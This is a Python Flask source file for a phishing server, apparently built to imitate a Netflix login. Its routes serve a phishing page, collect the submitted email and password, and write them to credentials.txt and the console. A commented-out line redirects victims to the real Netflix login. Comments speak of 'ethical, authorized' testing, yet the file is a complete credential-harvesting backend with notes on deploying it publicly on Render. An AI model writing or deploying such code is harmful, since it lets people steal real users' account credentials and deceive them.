import os
from flask import Flask, request, render_template, redirect
app = Flask(__name__)
# This route serves the phishing page
@app.route('/', methods=['GET'])
def show_phishing_page():
    # Renders the HTML file from the 'templates' folder
    return render_template('phishing_page.html') 
# This route handles the form submission (where credentials are sent)
@app.route('/login_submit', methods=['POST'])
def harvest_credentials():
    # Get email and password from the submitted form
    email = request.form.get('email')
    password = request.form.get('password')
    # --- IMPORTANT SECURITY CONSIDERATION FOR PUBLIC DEPLOYMENT ---
    # Storing credentials directly to a file on a cloud server might not be persistent
    # and is a security risk if the file is accessible.
    # For *ethical, authorized* penetration testing, you'd integrate with a secure logging
    # system, not a local file. For this example, we keep the file writing
    # but reiterate it's only for *local* ethical learning.
    # When deploying, this part would typically be removed or replaced
    # with a secure, authorized logging mechanism (e.g., sending to a secure Splunk instance).
    
    # Log the captured credentials to a file (might not persist on Render's ephemeral filesystem)
    # For actual deployment, this part should be redesigned for secure logging.
    try:
        with open('credentials.txt', 'a') as f:
            f.write(f"Timestamp: {request.date}, Email: {email}, Password: {password}\n")
        print(f"Captured Credentials - Email: {email}, Password: {password}")
    except Exception as e:
        print(f"Error writing to credentials.txt: {e}")
        # In a real app, you'd log this error to a monitoring system
    # Redirect the user to the actual Netflix login page after submission
    # return redirect("https://www.netflix.com/login") 
    return "<html><body><h2>Thank you for logging in!</h2><p>Your test credentials have been captured locally.</p></body></html>"
# The main entry point for the application when run with Gunicorn
# Get the PORT environment variable provided by Render, default to 5000 if not found
port = int(os.environ.get("PORT", 5000))
if __name__ == '__main__':
    # When running directly (e.g., during local development), use Flask's dev server
    app.run(host='0.0.0.0', port=port, debug=False) # Set debug=False for production!
     